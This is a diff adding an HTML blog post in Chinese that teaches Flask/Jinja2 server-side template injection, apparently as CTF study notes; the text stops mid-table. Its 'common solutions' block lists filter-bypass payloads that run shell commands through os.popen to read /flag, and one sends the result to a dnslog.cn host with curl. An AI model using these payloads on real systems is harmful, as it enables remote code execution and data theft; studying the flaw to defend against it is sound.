@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="阿巴">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/08/09/ssti模板注入/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="SSTI模板注入flask基本介绍flask是一个使用python语言编写的轻量级web应用框架其WSGI工具箱采用Werkzeug，模板弓|擎则使用Jinja2。Flask使用BSD授权。 Flask的特点有:良好的文档、丰富的插件、包含开发服务器和调试器(debugger)、 集成支持单元测试、RESTful请求调度、 支持安全cookies、 基于Unicode。 Python可直接用f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssti模板注入">
+<meta property="og:url" content="http://example.com/2023/08/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="阿巴">
+<meta property="og:description" content="SSTI模板注入flask基本介绍flask是一个使用python语言编写的轻量级web应用框架其WSGI工具箱采用Werkzeug，模板弓|擎则使用Jinja2。Flask使用BSD授权。 Flask的特点有:良好的文档、丰富的插件、包含开发服务器和调试器(debugger)、 集成支持单元测试、RESTful请求调度、 支持安全cookies、 基于Unicode。 Python可直接用f">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%941.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%942.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%943.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%944.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%945.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%946.png">
+<meta property="og:image" content="http://example.com/source/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%947.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%948.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%9410.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%949.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A41.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B72.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B71.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B72.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4.png">
+<meta property="og:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A41.png">
+<meta property="article:published_time" content="2023-08-09T11:46:00.000Z">
+<meta property="article:modified_time" content="2023-08-09T11:57:41.622Z">
+<meta property="article:author" content="阿巴">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%941.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/8d.png@1256w_1256h_!web-article-pic.webp" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/8d.png@1256w_1256h_!web-article-pic.webp">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/8d.png@1256w_1256h_!web-article-pic.webp">
+    <!--- Page Info-->
+    
+    <title>
+        
+            ssti模板注入 -
+        
+        阿巴
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/e6d1c777bb54674dd5cc6ed2c6147596a899ed7b.jpg@1256w_708h_!web-article-pic.webp","dark":"/images/688bff5fab134b2da7d52ca53163372d39812ec8.jpg@1256w_708h_!web-article-pic.webp"},"title":"阿巴的小站","subtitle":{"text":[],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/621779","instagram":"https://www.instagram.com/","zhihu":"https://www.zhihu.com/people/zhi-chu-85-7","twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.2.2","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"如果讨厌当前的处境，那就不惜一切代价上去，然后去追随梦想吧！","links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/12/11  12：00：00"};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                阿巴
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                
+                  <h1 class="article-title-regular">ssti模板注入</h1>
+                
+              </div>
+              
+                     
+            
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/49871906.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">阿巴</span>
+                            
+                                <span class="author-label">Lv2</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-08-09 19:46</span>
+        <span class="mobile">2023-08-09 19:46</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-08-09 19:57:41</span>
+            <span class="mobile">2023-08-09 19:57:41</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <span id="more"></span>
+
+<h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><h2 id="flask基本介绍"><a href="#flask基本介绍" class="headerlink" title="flask基本介绍"></a>flask基本介绍</h2><p>flask是一个使用python语言编写的轻量级web应用框架其WSGI工具箱采用Werkzeug，模板弓|擎则使用Jinja2。Flask使用BSD授权。</p>
+<p>Flask的特点有:良好的文档、丰富的插件、包含开发服务器和调试器(debugger)、 集成支持单元测试、RESTful请求调度、 支持安全cookies、 基于Unicode。</p>
+<p>Python可直接用flask启动一个web服务页面。</p>
+<p><strong>使用方法</strong>：在进入我们自己暗转环境的文件夹之后输入<code>source ./bin/activate</code>，便可以开始写代码了，以下为一段示例代码：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token operator">//</span>这里表示路由，可以自行修改为合适的，如修改为flag时，访问时要加IP<span class="token operator">/</span>flag才会显示内容
+<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">return</span> <span class="token string">"hello world!"</span>
+<span class="token keyword">if</span> __name__<span class="token operator">=</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+	app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token operator">//</span>run中可填host<span class="token operator">=</span><span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span>，表示可以被全部访问到，不填默认<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>，还可以debug<span class="token operator">=</span>true，这样会显示错误便于修改。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="flask的变量与方法"><a href="#flask的变量与方法" class="headerlink" title="flask的变量与方法"></a>flask的变量与方法</h3><p><strong>变量</strong>：</p>
+<p>通过在代码中增加变量的方法。可以动态的使用url，以上边的示例为例，假设我们现在需要让他访问者输入什么，我们就输出什么就需要用到变量。代码如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>_ name
+<span class="token decorator annotation punctuation">@app</span> <span class="token punctuation">.</span> route<span class="token punctuation">(</span> <span class="token string">' /benben/ &lt;name>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span> 
+	<span class="token keyword">return</span> <span class="token string">"hello %s"</span> <span class="token operator">%</span> name
+    <span class="token operator">//</span>这里的<span class="token operator">%</span>s和下面的<span class="token operator">%</span>d表示的数据的类型，跟python中的相同
+<span class="token decorator annotation punctuation">@app</span> <span class="token punctuation">.</span> route<span class="token punctuation">(</span> <span class="token string">' /int/ &lt;int:postID>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">id</span><span class="token punctuation">(</span> postID<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">return</span> <span class="token string">" %d "</span> <span class="token operator">%</span> postID
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__ '</span> <span class="token punctuation">:</span>
+	app<span class="token punctuation">.</span> run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span> <span class="token punctuation">,</span> debug<span class="token operator">=</span> <span class="token boolean">True</span> <span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8081</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>方法</strong></p>
+<p>在flask中常见方法如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%941.png"
+                     
+                ></p>
+<p>用法实例如下图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%942.png"
+                     
+                ></p>
+<h2 id="flask模板介绍"><a href="#flask模板介绍" class="headerlink" title="flask模板介绍"></a>flask模板介绍</h2><p>视图函数：一个处理http请求的函数，视图函数通过装饰器将其与一个特定的URL绑定起来，当用户访问该URL时，Flask会调用相应的视图函数来处理请求。</p>
+<p>flask模板：lask模板是一种用于在Web应用程序中生成动态HTML内容的技术。它允许你将静态HTML文件与动态数据进行结合，以便根据不同的输入和条件生成不同的输出。</p>
+<p>两者在flask中的作用：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%943.png"
+                     
+                ></p>
+<h2 id="模板注入漏洞"><a href="#模板注入漏洞" class="headerlink" title="模板注入漏洞"></a>模板注入漏洞</h2><p>常见的题解：</p>
+<pre class="line-numbers language-none"><code class="language-none">过滤中括号，单双引号，下滑线：
+&#123;&#123;()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(406)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.g)(request.cookies.h)|attr(request.cookies.i)(request.cookies.j)|attr(request.cookies.k)()&#125;&#125;
+cookies：a&#x3D;__class__; b&#x3D;__base__; c&#x3D;__subclasses__; d&#x3D;__getitem__; e&#x3D;__init__; f&#x3D;__globals__; g&#x3D;__getitem__; h&#x3D;os; i&#x3D;popen; j&#x3D;cat &#x2F;flag; k&#x3D;read
+
+在上面的基础上再过滤双重大括号：
+&#123;%print(()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(406)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.g)(request.cookies.h)|attr(request.cookies.i)(request.cookies.j)|attr(request.cookies.k)())%&#125;
+cookies与上边相同
+
+在上面的基础上过滤了request
+&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#123;% set a&#x3D;(()|select|string|list)|attr(po)(24)%&#125;&#123;% set ini&#x3D;(a,a,dict(init&#x3D;a)|join,a,a)|join()%&#125;&#123;% set glo&#x3D;(a,a,dict(globals&#x3D;a)|join,a,a)|join()%&#125;&#123;% set geti&#x3D;(a,a,dict(getitem&#x3D;a)|join,a,a)|join()%&#125;&#123;% set built&#x3D;(a,a,dict(builtins&#x3D;a)|join,a,a)|join()%&#125;&#123;% set x&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr&#x3D;x.chr%&#125;&#123;% set file&#x3D;chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;&#123;%print(x.open(file).read())%&#125;
+
+在上面的基础上过滤数字：(全角数字绕过)
+&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#123;% set a&#x3D;(()|select|string|list)|attr(po)(２４)%&#125;&#123;% set ini&#x3D;(a,a,dict(init&#x3D;a)|join,a,a)|join()%&#125;&#123;% set glo&#x3D;(a,a,dict(globals&#x3D;a)|join,a,a)|join()%&#125;&#123;% set geti&#x3D;(a,a,dict(getitem&#x3D;a)|join,a,a)|join()%&#125;&#123;% set built&#x3D;(a,a,dict(builtins&#x3D;a)|join,a,a)|join()%&#125;&#123;% set x&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr&#x3D;x.chr%&#125;&#123;% set file&#x3D;chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%&#125;&#123;%print(x.open(file).read())%&#125;
+
+ban掉print：dnslog外带，数字可以用全角数字替换
+?name&#x3D;&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;&#123;%set j&#x3D;dict(eeeeeeeeeeeeeeeeee&#x3D;a)|join|count%&#125;&#123;%set k&#x3D;dict(eeeeeeeee&#x3D;a)|join|count%&#125;&#123;%set l&#x3D;dict(eeeeeeee&#x3D;a)|join|count%&#125;&#123;%set n&#x3D;dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee&#x3D;a)|join|count%&#125;&#123;%set m&#x3D;dict(eeeeeeeeeeeeeeeeeeee&#x3D;a)|join|count%&#125;&#123;% set b&#x3D;(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125;&#123;%set d&#x3D;(b,b,dict(getit&#x3D;cc,em&#x3D;aa)|join,b,b)|join%&#125;&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125;&#123;% set f&#x3D;(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set p&#x3D;((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;&#123;%set q&#x3D;((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;&#123;%set i&#x3D;(dict(curl&#x3D;aa)|join,f,p,dict(cat&#x3D;a)|join,f,g,dict(flag&#x3D;aa)|join,p,q,dict(得到的外带地址&#x3D;a)|join,q,dict(dnslog&#x3D;a)|join,q,dict(cn&#x3D;a)|join)|join%&#125;&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;XiLitter&#123;%endif%&#125;
+aoafbo.dnslog.cn
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="flask漏洞"><a href="#flask漏洞" class="headerlink" title="flask漏洞"></a>flask漏洞</h3><p><strong>漏洞成因</strong>：在模板渲染时没有对用户的输入进行严格的过滤，或使用了危险的模板，导致用户和flask程序可以交互，导致出现漏洞。漏洞会导致任意文件读取，和命令执行</p>
+<p>漏洞展示：</p>
+<p>正常代码：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%944.png"
+                     
+                ></p>
+<p>漏洞代码：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%945.png"
+                     
+                ></p>
+<p>上面两端代码，第一张是先解析在放入模板中，第二张是先到模板中，在解析，再进行显示，这种情况，如果没有过滤，就会导致注入现象发生。</p>
+<h3 id="漏洞的判断"><a href="#漏洞的判断" class="headerlink" title="漏洞的判断"></a>漏洞的判断</h3><p>通过下图可以逐步判断漏洞的模板类型</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%946.png"
+                     
+                ></p>
+<p>红色是未响应，如${7*7}无响应就是显示原值，有响应会返回49，绿色是有响应，通过这个逻辑我们可以判断是那个一种模板</p>
+<h3 id="继承关系和魔术方法"><a href="#继承关系和魔术方法" class="headerlink" title="继承关系和魔术方法"></a>继承关系和魔术方法</h3><h4 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h4><p>一下面的一段代码为例：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">:</span> <span class="token keyword">pass</span>
+<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">pass</span>
+<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">pass</span>
+<span class="token keyword">class</span> <span class="token class-name">D</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">pass</span>
+
+c <span class="token operator">=</span> C <span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">)</span>
+<span class="token comment">#运行结果：</span>
+<span class="token comment">#&lt;class '__main__.C'></span>
+<span class="token comment">#(&lt;class '__main__.C'>, &lt;class '__main__.B'>, &lt;class '__main__.A'>, &lt;class 'object'>)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到运行到最后显示A的父类是object，故可得，他是所有父子关系的顶层。其他的关系见下图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../source/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%947.png"
+                     
+                ></p>
+<p><strong>魔术方法</strong></p>
+<p><code>class</code>：查找当前类型的所属对象</p>
+<p><code>base</code>：沿着父子类的关系往上走一个</p>
+<p><code>mro</code>：查找当前类对象的所有继承类</p>
+<p><code>subclasses_ ()</code> ：查找父类下的所有子类</p>
+<p><code>_init_ </code>：查看类是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载</p>
+<p><code>_globals__</code>：函数会议字典的形式返回当前对象的全部全局变量</p>
+<p>常用类的用法：</p>
+<pre class="line-numbers language-none"><code class="language-none">__class__            	类的一个内置属性，表示实例对象的类。
